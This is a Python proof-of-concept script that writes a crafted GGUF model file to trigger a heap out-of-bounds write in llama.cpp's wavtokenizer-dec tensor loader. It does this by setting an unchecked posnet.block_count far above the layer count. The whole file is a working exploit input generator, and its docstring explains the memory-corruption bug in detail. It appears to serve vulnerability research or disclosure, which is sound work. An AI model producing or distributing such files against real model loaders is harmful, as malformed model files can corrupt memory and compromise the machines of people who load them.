#!/usr/bin/env python3
"""
Craft a GGUF that triggers an OOB write in wavtokenizer-dec's load_arch_tensors.

Bug: `layers` vector is resized to `n_layer_all` (from `block_count`, bounded
to ≤512), but the posnet loop runs `for (i = 0; i < hparams.posnet.n_layer; ++i)`
using `layers[i].posnet` — a SEPARATE GGUF key `posnet.block_count` with NO
bound check.  If `posnet.block_count > n_layer_all`, `layers[i]` is OOB on the
vector → heap OOB write when `layer.norm1 = create_tensor(...)` assigns past the
end of the vector's allocation.

Same applies to `convnext.block_count` / the convnext loop.

Run:  python3 craft_oob_wavtokenizer.py out.gguf [posnet_block_count]
"""
import sys, os
import numpy as np
from pathlib import Path

gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf

V = gguf.GGUFValueType

N_EMBD       = 64    # hparams.n_embd
POSNET_EMBD  = 128   # hparams.posnet.n_embd
CONVNEXT_EMBD = 128  # hparams.convnext.n_embd
N_VOCAB       = 256

def add_tensor_info(w, name, shape):
    """Add F32 tensor info (no data) to the GGUF."""
    nbytes = int(np.prod(shape)) * 4  # F32 = 4 bytes
    w.add_tensor_info(name, shape, np.dtype(np.float32), nbytes)

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/wavtokenizer_oob.gguf"
    posnet_blocks = int(sys.argv[2]) if len(sys.argv) > 2 else 100000
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)

    w = gguf.GGUFWriter(out, arch="wavtokenizer-dec")

    def kv(key, val, t):
        w.add_key_value(key, val, t)

    # ---- base loader hparams ----
    kv("general.architecture", "wavtokenizer-dec", V.STRING)
    kv("wavtokenizer-dec.context_length", 2048, V.UINT32)
    kv("wavtokenizer-dec.embedding_length", N_EMBD, V.UINT32)
    kv("wavtokenizer-dec.block_count", 1, V.UINT32)  # n_layer_all=1 (passes ≤512 guard)

    # wavtokenizer-dec specific (read in base load_hparams for this arch)
    # NOTE: features_length overrides n_embd, embedding_length -> n_embd_out_impl
    kv("wavtokenizer-dec.features_length", N_EMBD, V.UINT32)
    kv("wavtokenizer-dec.embedding_length", N_EMBD, V.UINT32)  # n_embd_out_impl
    kv("wavtokenizer-dec.posnet.embedding_length", POSNET_EMBD, V.UINT32)
    kv("wavtokenizer-dec.posnet.block_count", posnet_blocks, V.UINT32)  # UNBOUNDED → OOB
    kv("wavtokenizer-dec.convnext.embedding_length", CONVNEXT_EMBD, V.UINT32)
    kv("wavtokenizer-dec.convnext.block_count", 1, V.UINT32)

    # load_arch_hparams required keys
    kv("wavtokenizer-dec.attention.layer_norm_epsilon", 1e-5, V.FLOAT32)
    kv("wavtokenizer-dec.attention.group_norm_epsilon", 1e-5, V.FLOAT32)
    kv("wavtokenizer-dec.attention.group_norm_groups", 1, V.UINT32)

    # ---- minimal vocab (10 tokens to avoid vocab edge cases) ----
    n_vocab = 256
    kv("tokenizer.ggml.model", "bert", V.STRING)
    w.add_key_value("tokenizer.ggml.tokens", [f"tok_{i}" for i in range(n_vocab)], V.ARRAY, sub_type=V.STRING)
    w.add_key_value("tokenizer.ggml.scores", [0.0]*n_vocab, V.ARRAY, sub_type=V.FLOAT32)
    w.add_key_value("tokenizer.ggml.token_type", [0]*n_vocab, V.ARRAY, sub_type=V.INT32)
    kv("tokenizer.ggml.bos_id", 0, V.UINT32)
    kv("tokenizer.ggml.eos_id", 0, V.UINT32)
    kv("tokenizer.ggml.padding_id", 0, V.UINT32)
    kv("tokenizer.ggml.unknown_id", 0, V.UINT32)

    # ---- tensor info (no data, just headers so create_tensor finds them) ----
    # NOTE: gguf writer reverses dims, so pass [ne[1], ne[0]] for 2D, [ne[2], ne[1], ne[0]] for 3D
    # Before the posnet loop:
    add_tensor_info(w, "token_embd.weight", [N_VOCAB, N_EMBD])          # ne=[N_EMBD, N_VOCAB]
    add_tensor_info(w, "conv1d.weight",     [POSNET_EMBD, N_EMBD, 7])   # ne=[7, N_EMBD, POSNET_EMBD]
    add_tensor_info(w, "conv1d.bias",       [POSNET_EMBD, 1])            # ne=[1, POSNET_EMBD]

    # posnet layer 0 (valid — within layers[0], n_layer_all=1)
    for tname in ["norm1", "conv1", "norm2", "conv2"]:
        if "conv" in tname:
            add_tensor_info(w, f"posnet.0.{tname}.weight", [POSNET_EMBD, POSNET_EMBD, 3])  # ne=[3, E, E]
        else:
            add_tensor_info(w, f"posnet.0.{tname}.weight", [POSNET_EMBD, 1])  # ne=[1, E]
        add_tensor_info(w, f"posnet.0.{tname}.bias", [POSNET_EMBD, 1])           # ne=[1, E]

    # posnet layer 1 (OOB — layers[1] is past the vector's end since n_layer_all=1)
    add_tensor_info(w, "posnet.1.norm1.weight", [POSNET_EMBD, 1])  # ne=[1, E]

    w.write_header_to_file()
    w.write_kv_data_to_file()
    w.write_ti_data_to_file()

    # write aligned dummy data section (tensor info references offsets into this)
    import struct
    for fout in w.fout:
        # pad to data_alignment
        pos = fout.tell()
        pad = (w.data_alignment - pos % w.data_alignment) % w.data_alignment
        fout.write(b'\x00' * pad)
        # write dummy data for each tensor (padded to alignment)
        for name, ti in w.tensors[-1].items():
            fout.write(b'\x00' * ti.nbytes)
            pos2 = fout.tell()
            pad2 = (w.data_alignment - pos2 % w.data_alignment) % w.data_alignment
            fout.write(b'\x00' * pad2)

    w.flush()
    w.close()

    print(f"Written {out} (posnet.block_count={posnet_blocks}, block_count=1)")

if __name__ == "__main__":
    main()